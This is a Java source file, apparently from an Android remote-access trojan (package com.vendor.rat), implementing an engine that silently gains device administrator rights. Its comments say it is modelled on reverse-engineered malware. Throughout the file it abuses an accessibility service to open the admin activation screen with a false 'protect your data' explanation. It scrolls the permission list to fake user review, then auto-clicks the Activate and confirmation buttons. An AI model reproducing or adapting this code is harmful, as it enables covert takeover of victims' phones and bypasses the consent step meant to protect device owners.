package com.vendor.rat.auto.engine;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.service.AppDeviceAdminReceiver;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 设备管理员自动激活引擎
 *
 * 基于逆向分析 Part 7: 设备管理员权限自动激活
 *
 * 执行流程:
 *   1. execute() → 发送 ACTION_ADD_DEVICE_ADMIN Intent 打开激活界面
 *   2. 无障碍服务监听到 DeviceAdminAdd 界面
 *   3. 找到 ScrollView → scrollForwardEnd() 滚动到底部 (让系统认为用户已阅读权限列表)
 *   4. 查找 "激活" / "启用" / "Activate" 按钮
 *   5. 自动点击激活
 *   6. 处理可能的确认对话框
 *
 * 监听的界面:
 *   - com.android.settings / DeviceAdminAdd (设备管理员激活页)
 *   - android.app.AlertDialog (确认对话框)
 */
public class DeviceAdminEngine extends AutoEngine {

    private static final String TAG = "DeviceAdminEngine";

    // 包名
    private static final String SETTINGS = "com.android.settings";

    // Activity (部分厂商类名不同，用 contains 匹配)
    private static final String DEVICE_ADMIN_ADD = "DeviceAdminAdd";

    // 状态
    private final AtomicBoolean activated = new AtomicBoolean(false);

    public DeviceAdminEngine() {
        super(buildWindowMatchers(), SETTINGS);
    }

    /**
     * 构建窗口匹配列表
     * 监听设备管理员激活界面和对话框
     */
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 1. 设备管理员激活界面 — 类名包含 "DeviceAdminAdd"
        //    不同厂商可能有不同的完整类名，所以在 matchWindow 中用 contains 匹配
        WindowMatcher adminAdd = new WindowMatcher(SETTINGS);
        adminAdd.addEventType(32);     // TYPE_WINDOW_STATE_CHANGED
        adminAdd.addEventType(16384);  // TYPE_WINDOW_CONTENT_CHANGED
        list.add(adminAdd);

        return list;
    }

    /**
     * 重写窗口匹配 — 使用 contains 匹配 DeviceAdminAdd
     * 因为不同厂商的完整类名可能不同:
     *   - com.android.settings.DeviceAdminAdd
     *   - com.android.settings.applications.DeviceAdminAdd
     */
    @Override
    public boolean matchWindow(String packageName, String className, int eventType) {
        if (className != null && className.contains(DEVICE_ADMIN_ADD)) {
            return true;
        }
        // 也匹配对话框 (确认激活)
        if (SETTINGS.equals(packageName) && className != null
                && className.contains("AlertDialog")) {
            return true;
        }
        return false;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        if (activated.get()) return;

        log("Window matched: " + packageName + "/" + className);

        try {
            if (className != null && className.contains(DEVICE_ADMIN_ADD)) {
                handleDeviceAdminAddPage();
            } else if (className != null && className.contains("AlertDialog")) {
                handleConfirmDialog();
            }
        } catch (Exception e) {
            logError("Error handling device admin window", e);
        }
    }

    @Override
    public void execute() {
        openDeviceAdminActivation();
    }

    // ============ 打开激活界面 ============

    /**
     * 发送 ACTION_ADD_DEVICE_ADMIN Intent
     * 基于逆向 Part 7: openDeviceAdmin()
     */
    private void openDeviceAdminActivation() {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) {
                logError("Service not available");
                return;
            }

            Context context = service.getApplicationContext();

            // 检查是否已激活
            if (AppDeviceAdminReceiver.isAdminActive(context)) {
                log("Device admin already active");
                activated.set(true);
                finish();
                return;
            }

            ComponentName admin = AppDeviceAdminReceiver.getComponentName(context);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "为了保护您的数据安全，需要激活设备管理员");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            log("Opened device admin activation page");
        } catch (Exception e) {
            logError("Failed to open device admin activation", e);
        }
    }

    // ============ 自动化激活流程 ============

    /**
     * 处理设备管理员激活页面
     * 基于逆向 Part 7:
     *   1. 找到 ScrollView → 滚动到底部
     *   2. 等待 500ms
     *   3. 查找 "激活" / "启用" 按钮
     *   4. 点击激活
     */
    private void handleDeviceAdminAddPage() {
        sleep(500);

        UiNode root = getRootNode();
        if (root == null) {
            logError("Root node is null");
            return;
        }

        // Step 1: 滚动到底部 — 让系统认为用户已阅读完权限列表
        UiNode scrollable = root.findOneByCombine(CombineFilter.scrollable());
        if (scrollable != null) {
            scrollable.scrollForwardEnd();
            log("Scrolled to bottom of permission list");
            sleep(500);
            // 刷新根节点
            root = getRootNode();
            if (root == null) return;
        }

        // Step 2: 查找 "激活" / "启用" / "Activate" 按钮
        UiNode activateBtn = findActivateButton(root);

        if (activateBtn != null) {
            // Step 3: 点击激活
            boolean clicked = activateBtn.click();
            if (clicked) {
                log("Clicked activate button");
                activated.set(true);
                sleep(1000);

                // 验证是否激活成功
                MyAccessibilityService service = MyAccessibilityService.getInstance();
                if (service != null) {
                    Context context = service.getApplicationContext();
                    if (AppDeviceAdminReceiver.isAdminActive(context)) {
                        log("Device admin activated successfully");
                        finish();
                    }
                }
            } else {
                logError("Failed to click activate button");
            }
        } else {
            logError("Activate button not found");

            // 重试: 可能按钮在滚动后才出现
            sleep(1000);
            root = getRootNode();
            if (root != null) {
                activateBtn = findActivateButton(root);
                if (activateBtn != null) {
                    activateBtn.click();
                    log("Clicked activate button (retry)");
                    activated.set(true);
                    finish();
                }
            }
        }
    }

    /**
     * 查找激活按钮
     * 支持多语言: 激活/启用/Activate/Active
     */
    private UiNode findActivateButton(UiNode root) {
        // 优先查找 Button 类型
        UiNode btn = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.button("激活"),
                CombineFilter.button("启用"),
                CombineFilter.button("Activate"),
                CombineFilter.button("Active")
            )
        );

        if (btn != null) return btn;

        // 退而求其次: 查找任何包含激活文本的可点击节点
        btn = root.findOneByCombine(
            CombineFilter.and(
                new CombineFilter(CombineFilter.Logic.OR)
                    .add(StringCondition.textContains("激活"))
                    .add(StringCondition.textContains("启用"))
                    .add(StringCondition.textContains("Activate")),
                new com.vendor.rat.auto.condition.BoolCondition(
                    com.vendor.rat.auto.condition.BoolCondition.Property.CLICKABLE, true)
            )
        );

        return btn;
    }

    // ============ 确认对话框 ============

    /**
     * 处理确认对话框
     * 某些厂商在激活前会弹出额外确认
     */
    private void handleConfirmDialog() {
        sleep(300);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "确定" / "允许" / "OK" 按钮
        UiNode confirmBtn = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.button("确定"),
                CombineFilter.button("允许"),
                CombineFilter.button("OK"),
                CombineFilter.button("确认")
            )
        );

        if (confirmBtn != null) {
            confirmBtn.click();
            log("Clicked confirm button in dialog");
        }
    }

    // ============ 状态查询 ============

    public boolean isActivated() {
        return activated.get();
    }
}
